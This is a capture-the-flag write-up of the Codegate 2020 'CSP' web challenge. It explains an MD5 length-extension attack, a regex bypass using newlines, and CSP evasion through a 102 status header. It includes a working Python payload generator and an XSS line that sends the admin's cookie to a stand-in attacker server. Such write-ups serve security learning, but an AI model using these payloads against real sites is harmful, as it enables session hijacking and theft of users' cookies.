CSP
-----------

**Source:** https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp

## Description:

I made an simple echo service for my API practice. If you find bug, please tell me!
http://110.10.147.166/

Source code:

```php
<?php
require_once 'config.php';
if(!isset($_GET["q"]) || !isset($_GET["sig"])) {
    die("?");
}
$api_string = base64_decode($_GET["q"]);
$sig = $_GET["sig"];
if(md5($salt.$api_string) !== $sig){
    die("??");
}
//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...
$apis = explode("|", $api_string);
foreach($apis as $s) {
    $info = explode(",", $s);
    if(count($info) != 3)
        continue;
    $n = base64_decode($info[0]);
    $p1 = base64_decode($info[1]);
    $p2 = base64_decode($info[2]);
    if ($n === "header") {
        if(strlen($p1) > 10)
            continue;
        if(strpos($p1.$p2, ":") !== false || strpos($p1.$p2, "-") !== false) //Don't trick...
            continue;
        header("$p1: $p2");
    }
    elseif ($n === "cookie") {
        setcookie($p1, $p2);
    }
    elseif ($n === "body") {
        if(preg_match("/<.*>/", $p1))
            continue;
        echo $p1;
        echo "\n<br />\n";
    }
    elseif ($n === "hello") {
        echo "Hello, World!\n";
    }
}
```

If you download the attached file, you can see the above source code. It's code of `api.php` endpoint that the main endpoint of web service.

The goal of the task is to attack admin with XSS end steal his cookie. So, we could sploit XSS attack only on `api.php` page.

To make some action on this page we must send `q` and `sig` parameters that means Query and Signature.

The parameter `q` is the `base64` string from string like `name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64)...`. 

The value of `sig` is `q` after decoding with `salt` and hashed with `md5`. 

For hashing algorithms, such as md5, there is known vulnerability. `$salt + $value` forms of hash verification is vulnerable to length extension attack.

There is a link on HashPump tool to help you complete the payload: https://github.com/bwall/HashPump

Body part seems to be preventing tag insertion through regular expression validation, but because it is an invalid regular expression, you can bypass it with newline insertion as in following example.

```javascript
<script
>alert(1)</script
>
```

This issue is mitigated by CSP. However, CSP may not work with unusual status codes that we can inject with header injection.
The response status code can be set to `102` to bypass CSP .

Example:
```
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'none';");
header("HTTP/: 102");
?>
<script>alert(1)</script>
```

This is a payload script using the two techniques described above:

```python
from base64 import b64encode
import os
d1 = ['header', 'HTTP/', '102']
d2 = ['body', '<script\n>window.location.href="http://my.dedicated.server/?red="+document.cookie\n</script\n>', '']
d1 = ','.join(b64encode(c.encode()).decode() for c in d1)
d2 = ','.join(b64encode(c.encode()).decode() for c in d2)
merged = '|{}|{}'.format(d1, d2)
[sig, value] = os.popen("hashpump -s '697e91bd03ae11b196e095af93027e56' -d 'MQ==,Mg==,Mw==' -a '{}' -k 12".format(merged)).read().strip().split('\n')
q = b64encode(eval("b'''" + value + "'''")).decode()
print('http://110.10.147.166/api.php?sig={}&q={}'.format(sig, q))
```

You can configure the script to send cookie values ​​to a receivable location, such as a personal server. And then send the generated address to the web through the  site report function.

Result request:
```
GET /?red=FLAG=CODEGATE2020{CSP_m34n5_Content-Success-Policy_n0t_Security} HTTP/1.1
```